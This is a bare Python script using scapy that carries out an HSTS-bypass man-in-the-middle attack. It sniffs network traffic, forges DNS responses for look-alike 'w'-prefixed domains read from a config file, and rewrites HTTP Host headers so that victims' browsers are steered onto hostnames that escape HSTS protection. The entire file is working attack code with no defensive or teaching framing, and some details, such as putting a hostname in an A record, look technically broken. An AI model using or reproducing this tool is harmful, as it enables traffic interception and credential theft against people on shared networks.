from scapy.all import *
import re

class PacketInterceptor:
    def __init__(self, custom_domains):
        self.custom_domains = custom_domains

    def dns_response(self, packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qd:
            qname = packet[DNSQR].qname.decode()
            for domain in self.custom_domains:
                if 'w' + domain in qname:
                    if qname.startswith('wwww.'):
                        new_qname = qname.replace('wwww.', 'www.')
                    else:
                        parts = qname.split('.')
                        parts[0] = parts[0][1:]
                        new_qname = '.'.join(parts)

                    # Create the DNS response
                    dns_response = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                        DNS(
                            id=packet[DNS].id,
                            qd=packet[DNS].qd,
                            aa=1,
                            qr=1,
                            an=DNSRR(rrname=qname, rdata=new_qname)
                        )
                    )

                    send(dns_response, verbose=0)
                    return

    def http_request(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors='ignore')
            for domain in self.custom_domains:
                if re.search(rf'Host: {domain}', payload):
                    modified_payload = re.sub(rf'Host: {domain}', f'Host: w{domain}', payload)
                    packet[Raw].load = modified_payload.encode()

                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[TCP].chksum
                    send(packet, verbose=0)
                    return

    def process_packet(self, packet):
        if packet.haslayer(DNSQR):
            self.dns_response(packet)
        elif packet.haslayer(TCP) and packet.haslayer(Raw):
            self.http_request(packet)

    def start(self):
        sniff(prn=self.process_packet, store=0, filter="ip")

def parse_hsts_bypass_config(filename):
    with open(filename, 'r') as file:
        custom_domains = [line.strip() for line in file if line.strip()]
    return custom_domains

if __name__ == "__main__":
    custom_domains = parse_hsts_bypass_config('hsts_bypass.cfg')
    packet_interceptor = PacketInterceptor(custom_domains)
    packet_interceptor.start()
